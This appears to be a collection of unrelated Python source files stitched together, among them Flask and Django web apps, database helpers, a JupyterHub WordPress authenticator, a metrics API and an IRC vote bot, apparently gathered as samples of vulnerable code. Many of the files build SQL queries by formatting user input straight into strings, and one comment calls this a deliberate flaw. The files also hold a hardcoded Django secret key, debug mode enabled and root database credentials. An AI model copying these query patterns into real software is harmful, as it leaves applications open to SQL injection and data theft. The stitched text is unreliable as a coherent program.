def issue_delete_endpoint(id):
    return "Not implemented.", 501

if __name__ == "__main__":
    # Setup database schema.
    with open(SCHEMA_FILE) as schema:
        connection = sqlite3.connect(DATABASE_FILE)
        cursor = connection.cursor()
        cursor.executescript(schema.read())                    
        connection.commit()
        connection.close()

    # Parse port number.
    parser = argparse.ArgumentParser(
        description="tissue: a tiny issue tracker server"
    )
    parser.add_argument(
        "--port",
        "-p",
        type=int,
        help="http server port",
        default=5000
    )
    args = parser.parse_args()

    # Start HTTP server.
    app.run(debug=True, host="0.0.0.0", port=args.port)


import pymysql
import dbconfig

class DBHelper:
	def connect(self, database="crimemap"):
		return pymysql.connect(host='localhost',
				user=dbconfig.db_user,
				passwd=dbconfig.db_password,
				db=database)

	def get_all_inputs(self):
		connection = self.connect()
		try:
			query = "SELECT description FROM crimes;"
			with connection.cursor() as cursor:
				cursor.execute(query)                    
			return cursor.fetchall()
		finally:
			connection.close()

	def add_input(self, data):
		connection = self.connect()
		try:
			# The following introduces a deliberate security flaw.See section on SQL injection below
			query = "INSERT INTO crimes (description) VALUES('{}');".format(data)
			with connection.cursor() as cursor:
				cursor.execute(query)                    
				connection.commit()
		finally:
			connection.close()

	def clear_all(self):
		connection = self.connect()
		try:
			query = "DELETE FROM crimes;"
			with connection.cursor() as cursor:
				cursor.execute(query)                    
				connection.commit()
		finally:
			connection.close()

from django.shortcuts import render
from django.db import transaction
from django.core import serializers
from django.http import HttpResponse

from sio.models import *
from sio.forms import *

def make_view(request,
              messages=[],
              create_student_form=CreateStudentForm(),
              create_course_form=CreateCourseForm(),
              register_student_form=RegisterStudentForm()):
    context = {
               'courses':Course.objects.all(),
               'messages':messages,
               'create_student_form':create_student_form,
               'create_course_form':create_course_form,
               'register_student_form':register_student_form,
              }
    return render(request, 'sio.html', context)

def home(request):
    return make_view(request, [])

@transaction.atomic
def create_student(request):
    form = CreateStudentForm(request.POST)
    if not form.is_valid():
        return make_view(request, create_student_form=form)

    new_student = Student(andrew_id=form.cleaned_data['andrew_id'],
                          first_name=form.cleaned_data['first_name'],
                          last_name=form.cleaned_data['last_name'])
    new_student.save()
    return make_view(request, ['Added %s'%new_student])

@transaction.atomic
def create_course(request):
    form = CreateCourseForm(request.POST)
    if not form.is_valid():
        return make_view(request, create_course_form=form)

    new_course = Course(course_number=request.POST['course_number'],
                        course_name=request.POST['course_name'],
                        instructor=request.POST['instructor'])
    new_course.save()
    return make_view(request, messages=['Added %s'%new_course])

@transaction.atomic
def register_student(request):
    form = RegisterStudentForm(request.POST)
    if not form.is_valid():
        return make_view(request, register_student_form=form)

    course = Course.objects.get(course_number=request.POST['course_number'])
    student = Student.objects.get(andrew_id=request.POST['andrew_id'])
    course.students.add(student)
    course.save()
    return make_view(request, messages=['Added %s to %s' % (student, course)])


def get_student_by_name(request):
    first_name = request.GET.get('first_name', '')

    # The normal use of the ORM to get students by first name:
    #students = Student.objects.filter(first_name__exact=first_name)

    # The correct way to use raw SQL to get students by first name:
    #students = Student.objects.raw('select * from uni_student where first_name = %s', [first_name])

    # Gets students by first name, but is vulnerable to SQL injection attacks:
    students = Student.objects.raw('select * from sio_student where first_name = \'' + first_name + '\'')                    

    response_text = serializers.serialize('json', students)
    return HttpResponse(response_text, content_type='application/json')


"""
Django settings for webapps project.

Generated by 'django-admin startproject' using Django 1.10.1.

For more information on this file, see
https://docs.djangoproject.com/en/1.10/topics/settings/

For the full list of settings and their values, see
https://docs.djangoproject.com/en/1.10/ref/settings/
"""

import os

# Build paths inside the project like this: os.path.join(BASE_DIR, ...)
BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))


# Quick-start development settings - unsuitable for production
# See https://docs.djangoproject.com/en/1.10/howto/deployment/checklist/

# SECURITY WARNING: keep the secret key used in production secret!
SECRET_KEY = 'eumasrxjp9des1)c^0i%=fx6ge-++7e8qaxs8%%an6ait_@d_!'

# SECURITY WARNING: don't run with debug turned on in production!
DEBUG = True

ALLOWED_HOSTS = []


# Application definition

INSTALLED_APPS = [
    'django.contrib.admin',
    'django.contrib.auth',
    'django.contrib.contenttypes',
    'django.contrib.sessions',
    'django.contrib.messages',
    'django.contrib.staticfiles',
    'sio',
]

MIDDLEWARE = [
    'django.middleware.security.SecurityMiddleware',
    'django.contrib.sessions.middleware.SessionMiddleware',
    'django.middleware.common.CommonMiddleware',
    'django.middleware.csrf.CsrfViewMiddleware',
    'django.contrib.auth.middleware.AuthenticationMiddleware',
    'django.contrib.messages.middleware.MessageMiddleware',
    'django.middleware.clickjacking.XFrameOptionsMiddleware',
]

ROOT_URLCONF = 'webapps.urls'

TEMPLATES = [
    {
        'BACKEND': 'django.template.backends.django.DjangoTemplates',
        'DIRS': [],
        'APP_DIRS': True,
        'OPTIONS': {
            'context_processors': [
                'django.template.context_processors.debug',
                'django.template.context_processors.request',
                'django.contrib.auth.context_processors.auth',
                'django.contrib.messages.context_processors.messages',
            ],
        },
    },
]

WSGI_APPLICATION = 'webapps.wsgi.application'


# Database
# https://docs.djangoproject.com/en/1.10/ref/settings/#databases

DATABASES = {
    'default': {
        'ENGINE': 'django.db.backends.postgresql_psycopg2', # Add 'postgresql_psycopg2', 'mysql', 'sqlite3' or 'oracle'.
        'NAME': 'registration',                      # Or path to database file if using sqlite3.
        # The following settings are not used with sqlite3:
        'USER': 'postgres',
        'PASSWORD': '',                    
        'HOST': 'localhost',    # Empty for localhost through domain sockets or           '127.0.0.1' for localhost through TCP.
        'PORT': '',             # Set to empty string for default.
    }
}


# Password validation
# https://docs.djangoproject.com/en/1.10/ref/settings/#auth-password-validators

AUTH_PASSWORD_VALIDATORS = [
    {
        'NAME': 'django.contrib.auth.password_validation.UserAttributeSimilarityValidator',
    },
    {
        'NAME': 'django.contrib.auth.password_validation.MinimumLengthValidator',
    },
    {
        'NAME': 'django.contrib.auth.password_validation.CommonPasswordValidator',
    },
    {
        'NAME': 'django.contrib.auth.password_validation.NumericPasswordValidator',
    },
]


# Internationalization
# https://docs.djangoproject.com/en/1.10/topics/i18n/

LANGUAGE_CODE = 'en-us'

TIME_ZONE = 'UTC'

USE_I18N = True

USE_L10N = True

USE_TZ = True


# Static files (CSS, JavaScript, Images)
# https://docs.djangoproject.com/en/1.10/howto/static-files/

STATIC_URL = '/static/'

import sqlite3

from collections import OrderedDict as odict

import db_handler
import record_fetcher

def create_test_data():
	test_record = odict(
				{'id': 1, 'url': 'https://www.mozilla.org/en-US/firefox/central/', 'title': None,
				 'rev_host': 'gro.allizom.www.', 'visit_count': 0, 'hidden': 0, 'typed': 0,
				 'favicon_id': None, 'frecency': 76, 'last_visit_date': None, 'guid': 'NNqZA_f2KHI1',
				 'foreign_count': 1, 'url_hash': 47356370932282, 'description': None,
				 'preview_image_url': None
				 })
	return test_record


def preprocess_record(record):
	record.update({field: str(value) for field, value in record.items() if value is None})
	field_names = ', '.join([str(field) for field in record.keys()])
	data = list(record.values())
	return field_names, data


def make_queries(table_name, field_names, values):
	queries = {'create': '''CREATE TABLE {} ({})'''.format(table_name, field_names)}
	queries.update({'insert': "INSERT INTO {} VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)".format(table_name)})
	return queries


def create_table(cursor):
	try:
		cursor.execute(queries['create'])
	except sqlite3.OperationalError as excep:
		print(excep)


def insert_record(cursor, data):
	cursor.execute(queries['insert'], data)
	conn.commit()


test_record = create_test_data()
field_names, data = preprocess_record(test_record)
table_name = 'history'
queries = make_queries(table_name, field_names, values=data)

print(field_names)                    

conn, cur, filepath = db_handler.connect_db('test.sqlite')

create_table(cursor=cur)
insert_record(cursor=cur,data=data)
record_yielder = record_fetcher.yield_prepped_records(cursor=cur, table=table_name, filepath=filepath)

for record_ in record_yielder:
	print(record_)                    
	
conn.close()

#!/usr/bin/env python
# -*- coding:utf-8 -*-
from setuptools import setup, find_packages
import sys


def _requires_from_file(filename):
    return open(filename).read().splitlines()

setup_args = dict(
    name='jupyterhub-wordpressauthenticator',
    version='0.1',                    
    description='WordPress Authenticator for JupyterHub',
    url='https://github.com/harapekoaomushi/jupyterhub-wordpressauthenticator',
    author='Harapeko Aomushi',
    author_email='harapeko1aomushi@gmail.com',
    long_description="WordPress Authenticator for JupyterHub. Please read README.md",
    license='MIT License',
    packages=find_packages(),
    install_requires=_requires_from_file('requirements.txt'),
    keywords = ['Interactive', 'Interpreter', 'Shell', 'Web'],
    classifiers = [
        'Intended Audience :: Developers',
        'Intended Audience :: System Administrators',
        'Intended Audience :: Science/Research',
        'Programming Language :: Python',
        'Programming Language :: Python :: 3',
        'License :: OSI Approved :: MIT License'
    ]
)

if 'setuptools' in sys.modules:
    setup_args['install_requires'] = install_requires = []
    with open('requirements.txt') as f:
        for line in f.readlines():
            req = line.strip()
            if not req or req.startswith(('-e', '#')):
                continue
            install_requires.append(req)


def main():
    setup(**setup_args)

if __name__ == '__main__':
    main()

from jupyterhub.auth import Authenticator
from tornado import gen

from traitlets import (
    Unicode,
    Int
)
import pymysql
from passlib.hash import phpass


class WordPressAuthenticator(Authenticator):
    dbhost = Unicode("localhost", config=True, help="URL or IP address of the database server")
    dbport = Int(3306, min=1, max=65535, config=True, help="port of the database server")
    dbuser = Unicode(config=True, help="user name to access your wordpress database")
    dbpassword = Unicode(config=True, help="password to access your wordpress database")
    dbname = Unicode("wordpress", config=True, help="database name that your wordpress uses")
    table_prefix = Unicode("wp_", config=True, help="table prefix for your wordpress")

    @gen.coroutine
    def authenticate(self, handler, data):
        args = {}
        args["host"] = self.dbhost
        args["user"] = self.dbuser
        args["password"] = self.dbpassword
        args["db"] = self.dbname
        args["charset"] = "utf8mb4"
        args["cursorclass"] = pymysql.cursors.Cursor

        with pymysql.connect(**args) as cursor:
            sql =   "SELECT " \
                            "user_pass " \                    
                    "FROM " \
                            "{0}users " \                    
                    "WHERE " \
                            "user_login = \"{1}\"" \                    
                    .format(self.table_prefix, data["username"])                    
            if cursor.execute(sql) == 0:                    
                return None
            if phpass.verify(data["password"],cursor.fetchone()[0]) == True:
                return data["username"]
        return None

import os
import calendar
from datetime import datetime, timedelta
from itertools import groupby
from collections import Counter
from functools import wraps
from tools.failures import SETA_WINDOW
from src import jobtypes

import MySQLdb
from flask import Flask, request, json, Response, abort

SCRIPT_DIR = os.path.abspath(os.path.dirname(__file__))
static_path = os.path.join(os.path.dirname(SCRIPT_DIR), "static")
app = Flask(__name__, static_url_path="", static_folder=static_path)
JOBSDATA = jobtypes.Treecodes()


class CSetSummary(object):
    def __init__(self, cset_id):
        self.cset_id = cset_id
        self.green = Counter()
        self.orange = Counter()
        self.red = Counter()
        self.blue = Counter()


def create_db_connnection():
    return MySQLdb.connect(host="localhost",
                           user="root",
                           passwd="root",
                           db="ouija")


def serialize_to_json(object):
    """Serialize class objects to json"""
    try:
        return object.__dict__
    except AttributeError:
        raise TypeError(repr(object) + 'is not JSON serializable')


def json_response(func):
    """Decorator: Serialize response to json"""
    @wraps(func)
    def wrapper(*args, **kwargs):
        result = json.dumps(func(*args, **kwargs) or {"error": "No data found for your request"},
                            default=serialize_to_json)
        headers = [
            ("Content-Type", "application/json"),
            ("Content-Length", str(len(result)))
        ]
        return Response(result, status=200, headers=headers)

    return wrapper


def get_date_range(dates):
    if dates:
        return {'startDate': min(dates).strftime('%Y-%m-%d %H:%M'),
                'endDate': max(dates).strftime('%Y-%m-%d %H:%M')}


def clean_date_params(query_dict, delta=7):
    """Parse request date params"""
    now = datetime.now()

    # get dates params
    start_date_param = query_dict.get('startDate') or query_dict.get('startdate')                    
    end_date_param = query_dict.get('endDate') or query_dict.get('enddate')                    

    # parse dates
    end_date = (parse_date(end_date_param) or now)
    start_date = parse_date(start_date_param) or end_date - timedelta(days=delta)

    # validate dates
    if start_date > now or start_date.date() >= end_date.date():
        start_date = now - timedelta(days=7)
        end_date = now + timedelta(days=1)

    return start_date.date(), end_date.date()


def parse_date(date_):
    if date_ is None:
        return

    masks = ['%Y-%m-%d',
             '%Y-%m-%dT%H:%M',
             '%Y-%m-%d %H:%M']

    for mask in masks:
        try:
            return datetime.strptime(date_, mask)
        except ValueError:
            pass


def calculate_fail_rate(passes, retries, totals):
    # skip calculation for slaves and platform with no failures
    if passes == totals:
        results = [0, 0]

    else:
        results = []
        denominators = [totals - retries, totals]
        for denominator in denominators:
            try:
                result = 100 - (passes * 100) / float(denominator)
            except ZeroDivisionError:
                result = 0
            results.append(round(result, 2))

    return dict(zip(['failRate', 'failRateWithRetries'], results))


def binify(bins, data):
    result = []
    for i, bin in enumerate(bins):
        if i > 0:
            result.append(len(filter(lambda x: x >= bins[i - 1] and x < bin, data)))
        else:
            result.append(len(filter(lambda x: x < bin, data)))

    result.append(len(filter(lambda x: x >= bins[-1], data)))

    return result


@app.route("/data/results/flot/day/")
@json_response
def run_results_day_flot_query():
    """
    This function returns the total failures/total jobs data per day for all platforms.
    It is sending the data in the format required by flot.Flot is a jQuery package used
    for 'attractive' plotting
    """
    start_date, end_date = clean_date_params(request.args)

    platforms = ['android4.0',
                 'android2.3',
                 'linux32',
                 'winxp',
                 'win7',
                 'win8',
                 'osx10.6',
                 'osx10.7',
                 'osx10.8']
    db = create_db_connnection()

    data_platforms = {}
    for platform in platforms:
        cursor = db.cursor()
        cursor.execute("""select DATE(date) as day,sum(result="%s") as failures,count(*) as
                          totals from testjobs where platform="%s" and date >= "%s" and date <= "%s"
                          group by day""" % ('testfailed', platform, start_date, end_date))

        query_results = cursor.fetchall()

        dates = []
        data = {}
        data['failures'] = []
        data['totals'] = []

        for day, fail, total in query_results:
            dates.append(day)
            timestamp = calendar.timegm(day.timetuple()) * 1000
            data['failures'].append((timestamp, int(fail)))
            data['totals'].append((timestamp, int(total)))

        cursor.close()

        data_platforms[platform] = {'data': data, 'dates': get_date_range(dates)}

    db.close()
    return data_platforms


@app.route("/data/slaves/")
@json_response
def run_slaves_query():
    start_date, end_date = clean_date_params(request.args)

    days_to_show = (end_date - start_date).days
    if days_to_show <= 8:
        jobs = 5
    else:
        jobs = int(round(days_to_show * 0.4))

    info = '''Only slaves with more than %d jobs are displayed.''' % jobs

    db = create_db_connnection()
    cursor = db.cursor()
    cursor.execute("""select slave, result, date from testjobs
                      where result in
                      ("retry", "testfailed", "success", "busted", "exception")
                      and date between "{0}" and "{1}"
                      order by date;""".format(start_date, end_date))

    query_results = cursor.fetchall()
    cursor.close()
    db.close()

    if not query_results:
        return

    data = {}
    labels = 'fail retry infra success total'.split()
    summary = {result: 0 for result in labels}
    summary['jobs_since_last_success'] = 0
    dates = []

    for name, result, date in query_results:
        data.setdefault(name, summary.copy())
        data[name]['jobs_since_last_success'] += 1
        if result == 'testfailed':
            data[name]['fail'] += 1
        elif result == 'retry':
            data[name]['retry'] += 1
        elif result == 'success':
            data[name]['success'] += 1
            data[name]['jobs_since_last_success'] = 0
        elif result == 'busted' or result == 'exception':
            data[name]['infra'] += 1
        data[name]['total'] += 1
        dates.append(date)

    # filter slaves
    slave_list = [slave for slave in data if data[slave]['total'] > jobs]

    # calculate failure rate only for slaves that we're going to display
    for slave in slave_list:
        results = data[slave]
        fail_rates = calculate_fail_rate(results['success'],
                                         results['retry'],
                                         results['total'])
        data[slave]['sfr'] = fail_rates

    platforms = {}

    # group slaves by platform and calculate platform failure rate
    slaves = sorted(data.keys())
    for platform, slave_group in groupby(slaves, lambda x: x.rsplit('-', 1)[0]):
        slaves = list(slave_group)

        # don't calculate failure rate for platform we're not going to show
        if not any(slave in slaves for slave in slave_list):
            continue

        platforms[platform] = {}
        results = {}

        for label in ['success', 'retry', 'total']:
            r = reduce(lambda x, y: x + y,
                       [data[slave][label] for slave in slaves])
            results[label] = r

        fail_rates = calculate_fail_rate(results['success'],
                                         results['retry'],
                                         results['total'])
        platforms[platform].update(fail_rates)

    # remove data that we don't need
    for slave in data.keys():
        if slave not in slave_list:
            del data[slave]

    return {'slaves': data,
            'platforms': platforms,
            'dates': get_date_range(dates),
            'disclaimer': info}


@app.route("/data/platform/")
@json_response
def run_platform_query():
    platform = request.args.get("platform")                    
    build_system_type = request.args.get("build_system_type")                    
    start_date, end_date = clean_date_params(request.args)

    log_message = 'platform: %s startDate: %s endDate: %s' % (platform,
                                                              start_date.strftime('%Y-%m-%d'),
                                                              end_date.strftime('%Y-%m-%d'))
    app.logger.debug(log_message)

    db = create_db_connnection()
    cursor = db.cursor()

    query = """select distinct revision from testjobs
                      where platform = '%s'
                      and branch = 'mozilla-central'
                      and date between '%s' and '%s'
                      and build_system_type='%s'
                      order by date desc;""" % (platform, start_date, end_date, build_system_type)

    cursor.execute(query)

    csets = cursor.fetchall()

    cset_summaries = []
    test_summaries = {}
    dates = []

    labels = 'green orange blue red'.split()
    summary = {result: 0 for result in labels}

    for cset in csets:
        cset_id = cset[0]
        cset_summary = CSetSummary(cset_id)

        query = """select result, testtype, date from testjobs
                   where platform='%s' and buildtype='opt' and revision='%s' and
                   build_system_type='%s' order by testtype""" % (
            platform, cset_id, build_system_type)

        cursor.execute(query)
        test_results = cursor.fetchall()

        for res, testtype, date in test_results:
            test_summary = test_summaries.setdefault(testtype, summary.copy())

            if res == 'success':
                cset_summary.green[testtype] += 1
                test_summary['green'] += 1
            elif res == 'testfailed':
                cset_summary.orange[testtype] += 1
                test_summary['orange'] += 1
            elif res == 'retry':
                cset_summary.blue[testtype] += 1
                test_summary['blue'] += 1
            elif res == 'exception' or res == 'busted':
                cset_summary.red[testtype] += 1
                test_summary['red'] += 1
            elif res == 'usercancel':
                app.logger.debug('usercancel')
            else:
                app.logger.debug('UNRECOGNIZED RESULT: %s' % res)
            dates.append(date)

        cset_summaries.append(cset_summary)

    cursor.close()
    db.close()

    # sort tests alphabetically and append total & percentage to end of the list
    test_types = sorted(test_summaries.keys())
    test_types += ['total', 'percentage']

    # calculate total stats and percentage
    total = Counter()
    percentage = {}

    for test in test_summaries:
        total.update(test_summaries[test])
    test_count = sum(total.values())

    for key in total:
        percentage[key] = round((100.0 * total[key] / test_count), 2)

    fail_rates = calculate_fail_rate(passes=total['green'],
                                     retries=total['blue'],
                                     totals=test_count)

    test_summaries['total'] = total
    test_summaries['percentage'] = percentage

    return {'testTypes': test_types,
            'byRevision': cset_summaries,
            'byTest': test_summaries,
            'failRates': fail_rates,
            'dates': get_date_range(dates)}


@app.route("/data/jobtypes/")
@json_response
def run_jobtypes_query():
    return {'jobtypes': JOBSDATA.jobtype_query()}


@app.route("/data/seta/")
@json_response
def run_seta_query():
    start_date, end_date = clean_date_params(request.args, delta=SETA_WINDOW)

    db = create_db_connnection()
    cursor = db.cursor()
    query = "select bugid, platform, buildtype, testtype, duration from testjobs \
             where failure_classification=2 and date>='%s' and date<='%s'" % (start_date, end_date)
    cursor.execute(query)
    failures = {}
    for d in cursor.fetchall():
        failures.setdefault(d[0], []).append(d[1:])

    return {'failures': failures}


@app.route("/data/setasummary/")
@json_response
def run_seta_summary_query():
    db = create_db_connnection()
    cursor = db.cursor()
    query = "select distinct date from seta"
    cursor.execute(query)
    retVal = {}
    dates = []
    for d in cursor.fetchall():
        dates.append(d[0])

    for d in dates:
        query = "select count(id) from seta where date='%s'" % d
        cursor.execute(query)
        results = cursor.fetchall()
        retVal['%s' % d] = "%s" % results[0]

    return {'dates': retVal}


@app.route("/data/setadetails/")
@json_response
def run_seta_details_query():
    date = request.args.get("date", "")                    
    active = request.args.get("active", 0)                    
    buildbot = request.args.get("buildbot", 0)                    
    branch = request.args.get("branch", '')                    
    taskcluster = request.args.get("taskcluster", 0)                    
    priority = request.args.get("priority", "low")                    
    jobnames = JOBSDATA.jobnames_query()
    if date == "" or date == "latest":
        today = datetime.now()
        date = today.strftime("%Y-%m-%d")

    db = create_db_connnection()
    cursor = db.cursor()
    query = "select jobtype from seta where date='%s 00:00:00'" % date
    cursor.execute(query)
    retVal = {}
    retVal[date] = []
    jobtype = []

    # we only support fx-team and mozilla-inbound branch in seta
    if (str(branch) in ['fx-team', 'mozilla-inbound', 'autoland']) is not True \
            and str(branch) != '':
        abort(404)
    for d in cursor.fetchall():
        parts = d[0].split("'")
        jobtype.append([parts[1], parts[3], parts[5]])

    alljobs = JOBSDATA.jobtype_query()

    # Because we store high value jobs in seta table as default,
    # so we return low value jobs(default) when the priority is 'low',
    # otherwise we return high value jobs.
    if priority == 'low':
        low_value_jobs = [low_value_job for low_value_job in alljobs if
                          low_value_job not in jobtype]
        jobtype = low_value_jobs

    if active:
        active_jobs = []
        for job in alljobs:
            found = False
            for j in jobtype:
                if j[0] == job[0] and j[1] == job[1] and j[2] == job[2]:
                    found = True
                    break
            if not found:
                active_jobs.append(job)
        jobtype = active_jobs

    if buildbot:
        active_jobs = []
        # pick up buildbot jobs from job list to faster the filter process
        buildbot_jobs = [job for job in jobnames if job['buildplatform'] == 'buildbot']
        # find out the correspond job detail information
        for job in jobtype:
            for j in buildbot_jobs:
                if j['name'] == job[2] and j['platform'] == job[0] and j['buildtype'] == job[1]:
                    active_jobs.append(j['ref_data_name'] if branch is 'mozilla-inbound'
                                       else j['ref_data_name'].replace('mozilla-inbound', branch))

        jobtype = active_jobs

    if taskcluster:
        active_jobs = []
        taskcluster_jobs = [job for job in jobnames if job['buildplatform'] == 'taskcluster']
        for job in jobtype:
            for j in taskcluster_jobs:
                if j['name'] == job[2] and j['platform'] == job[0] and j['buildtype'] == job[1]:
                    active_jobs.append(j['ref_data_name'])
        jobtype = active_jobs

    retVal[date] = jobtype
    return {'jobtypes': retVal}                    


@app.route("/data/jobnames/")
@json_response
def run_jobnames_query():
    # inbound is a safe default
    json_jobnames = {'results': JOBSDATA.jobnames_query()}

    return json_jobnames


@app.route("/data/dailyjobs/")
@json_response
def run_dailyjob_query():
    start_date, end_date = clean_date_params(request.args)
    db = create_db_connnection()
    cursor = db.cursor()
    query = "select date, platform, branch, numpushes, numjobs, sumduration from dailyjobs \
             where date>='%s' and date <='%s'\
             order by case platform \
                when 'linux' then 1 \
                when 'osx' then 2  \
                when 'win' then 3  \
                when 'android' then 4 \
                end" % (start_date, end_date)
    cursor.execute(query)
    output = {}
    for rows in cursor.fetchall():
        date = str(rows[0])
        platform = rows[1]
        branch = rows[2]
        numpushes = int(rows[3])
        numjobs = int(rows[4])
        sumduration = int(rows[5])

        if date not in output:
            output[date] = {'mozilla-inbound': [], 'fx-team': [], 'try': [], 'autoland': []}
        if 'mozilla-inbound' in branch:
            output[date]['mozilla-inbound'].append([platform, numpushes, numjobs, sumduration])
        elif 'fx-team' in branch:
            output[date]['fx-team'].append([platform, numpushes, numjobs, sumduration])
        elif 'try' in branch:
            output[date]['try'].append([platform, numpushes, numjobs, sumduration])
        elif 'autoland' in branch:
            output[date]['autoland'].append([platform, numpushes, numjobs, sumduration])
    return {'dailyjobs': output}


@app.errorhandler(404)
@json_response
def handler404(error):
    return {"status": 404, "msg": str(error)}


@app.route("/")
def root_directory():
    return template("index.html")


@app.route("/<string:filename>")
def template(filename):
    filename = os.path.join(static_path, filename)
    if os.path.exists(filename):
        with open(filename, 'r') as f:
            response_body = f.read()
        return response_body
    abort(404)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8157, debug=False)


import time

import math
from flask import request
from pyMetricServer import app
from pyMetricServer.system.database import database, getMetric
from werkzeug.exceptions import abort
from pyMetricServer.system.decorators import crossdomain
from flask.json import jsonify


@app.route("/metric/api/v1.0/metric/get")
@crossdomain(origin="*")
def get_metric():
    """
    Used to get a list of metric data.
    GET Params:
        fromtime    -   specifies a min timestamp to search for
        totime      -   specifies a max timestamp to search for
        origin      -   specifies the origin field in the database to search for
        key         -   specifies the key field in the database to search for
        count       -   specifies how many rows should be returned
        order       -   specifies the field by which resulsts get ordered
        desc        -   specifies wether the results are sorted in ascending oder descending order
    :return:    return all rows in metric data which matches specified criteria
    """
    res = getMetric(request.args.get("fromtime", None), request.args.get("totime", None),
                    request.args.get("origin", None), request.args.get("key", None), request.args.get("count", None),
                    (request.args.get("order", "Time"), bool(request.args.get("desc", True))));
    return jsonify({"results": res, "resultcount": len(res)})


@app.route("/metric/api/v1.0/metric/current")
@crossdomain(origin="*")
def current_metric():
    res = getMetric(request.args.get("fromtime", None), request.args.get("totime", None),
                    request.args.get("origin", None), request.args.get("key", None), 1,
                    ("Time", True))                    
    return jsonify({"results": res, "resultcount": len(res)})


@app.route('/metric/api/v1.0/metric', methods=['POST'])
@crossdomain(origin='*')
def add_metric():
    # print request.json
    if not request.json or not 'Origin' in request.json or not 'Key' in request.json or not 'Value' in request.json:
        abort(400)
    else:
        cursor = database.cursor()
        cursor.execute("INSERT INTO log_metric (Time, Origin, Key, Value) VALUES (%s,%s,%s,%s);",
                       (time.time(), request.json["Origin"], request.json["Key"], request.json["Value"]))
        cursor.close()
        database.commit()
        return "{'message': 'OK'}"




import psycopg2
from pyMetricServer.config import *
import time


database = psycopg2.connect(host=DATABASE_HOST, port=DATABASE_PORT, user=DATABASE_USER, password=DATABASE_PASS, database=DATABASE_NAME)
cursor = database.cursor();
cursor.execute("CREATE TABLE IF NOT EXISTS log_messages (Id BIGSERIAL, Time INTEGER, Origin TEXT, Message TEXT, Type INTEGER);")
cursor.execute("CREATE TABLE IF NOT EXISTS log_metric (Id BIGSERIAL, Time INTEGER, Origin TEXT, Key TEXT, Value DOUBLE PRECISION)")
database.commit()
cursor.close()



def getMetric(timefrom = None, timeto = None, origin = None, key = None, count = None, order = None):
    results = []
    cursor = database.cursor()

    params = []
    query = "SELECT Id, Time, Origin, Key, Value FROM log_metric "
    if(timefrom != None or timeto != None or origin != None or key != None):
        query += "WHERE "

    if timefrom != None:
        query += "Time >= %s AND "
        params.append(timefrom)

    if timeto != None:
        query += "Time <= %s AND "
        params.append(timeto)

    if origin != None:
        query += "Origin = %s AND "
        params.append(origin)

    if key != None:
        query += "Key = %s AND "
        params.append(key)

    query = query.strip("AND ")
    query += " "


    if order != None and order[0] != None:
        if(order[1]):                    
            query += "ORDER BY %s DESC " % order[0]                    
        else:
            query += "ORDER BY %s ASC " % order[0]                    

    if count != None:
        query += "LIMIT %s "
        params.append(count)

    cursor.execute(query, tuple(params))
    for row in cursor:
        results.append({
            "Id": str(row[0]),
            "Time": str(row[1]),
            "Origin": str(row[2]),
            "Key": str(row[3]),
            "Value": str(row[4]),
        })

    return results


# "Database code" for the DB Forum.

import datetime
import psycopg2


# Get posts from database

def get_posts():
  # Connect to database.
  db = psycopg2.connect("dbname=forum")
  # Create cursor to sort
  c = db.cursor()
  """Return all posts from the 'database', most recent first."""
  c.execute("SELECT time, content FROM posts order by time DESC")
  posts = ({'content': str(row[1]), 'time': str(row[0])}
           for row in c.fetchall())
  db.close()
  return posts

# Add Post to Database

def add_post(content):
  """Add a post to the 'database' with the current timestamp."""
  db = psycopg2.connect("dbname=forum")
  c = db.cursor()
  c.execute("INSERT INTO posts (content) VALUES ('%s')" % content)                    
  db.commit()
  db.close()

from util import hook, user, database
import time

db_ready = False

def db_init(db):
    global db_ready
    db.execute("CREATE TABLE if not exists votes(chan, action, target, voters, time, primary key(chan, action, target));")
    db.commit()
    db_ready = True

def process_vote(target,action,chan,mask,db,notice,conn):
    if ' ' in target: 
        notice('Invalid nick')
        return

    try: votes2kick = database.get(db,'channels','votekick','chan',chan)
    except: votes2kick = 10
    try: votes2ban = database.get(db,'channels','voteban','chan',chan)
    except: votes2ban = 10

    if len(target) is 0:
        if action is 'kick': notice('Votes required to kick: {}'.format(votes2kick))
        elif action is 'ban': notice('Votes required to ban: {}'.format(votes2ban))
        return

    votefinished = False
    global db_ready
    if not db_ready: db_init(db)
    chan = chan.lower()
    target = target.lower()
    voter = user.format_hostmask(mask)
    voters = db.execute("SELECT voters FROM votes where chan='{}' and action='{}' and target like '{}'".format(chan,action,target)).fetchone()                    

    if conn.nick.lower() in target: return "I dont think so Tim."

    if voters: 
        voters = voters[0]
        if voter in voters: 
            notice("You have already voted.")
            return
        else:
            voters = '{} {}'.format(voters,voter).strip()
            notice("Thank you for your vote!")
    else: 
        voters = voter

    votecount = len(voters.split(' '))

    if 'kick' in action: 
        votemax = int(votes2kick)
        if votecount >= votemax:
            votefinished = True
            conn.send("KICK {} {} :{}".format(chan, target, "You have been voted off the island."))
    if 'ban' in action:
        votemax = int(votes2ban)
        if votecount >= votemax:
            votefinished = True
            conn.send("MODE {} +b {}".format(chan, user.get_hostmask(target,db)))
            conn.send("KICK {} {} :".format(chan, target, "You have been voted off the island."))
    
    if votefinished: db.execute("DELETE FROM votes where chan='{}' and action='{}' and target like '{}'".format(chan,action,target))                    
    else: db.execute("insert or replace into votes(chan, action, target, voters, time) values(?,?,?,?,?)", (chan, action, target, voters, time.time()))
        
    db.commit()
    return ("Votes to {} {}: {}/{}".format(action, target, votecount,votemax))



@hook.command(autohelp=False)
def votekick(inp, nick=None, mask=None, conn=None, chan=None, db=None, notice=None):
    return process_vote(inp,'kick',chan,mask,db,notice,conn)


@hook.command(autohelp=False)
def voteban(inp, nick=None, mask=None, conn=None, chan=None, db=None, notice=None):
    return process_vote(inp,'ban',chan,mask,db,notice,conn)


# UPVOTE
 

 # @hook.command(autohelp=False)
# def vote(inp, nick=None, mask=None,conn=None, chan=None, db=None, notice=None):
#     global db_ready
#     if not db_ready: db_init(db)
#     chan = chan.lower()
#     action = inp.split(" ")[0].lower()
#     target = inp.split(" ")[1].lower()
#     voter = user.format_hostmask(mask)
#     voters = db.execute("SELECT voters FROM votes where chan='{}' and action='{}' and target like '{}'".format(chan,action,target)).fetchone()                    

#     if voters: 
#         voters = voters[0]
#         if voter in voters: 
#             notice("You have already voted.")
#             return
#         else:
#             voters = '{} {}'.format(voters,voter).strip()
#             notice("Thank you for your vote!")
#     else: 
#         voters = voter

#     votecount = len(voters.split(' '))

#     if votecount >= 4: 
#         if 'kick' in action: 
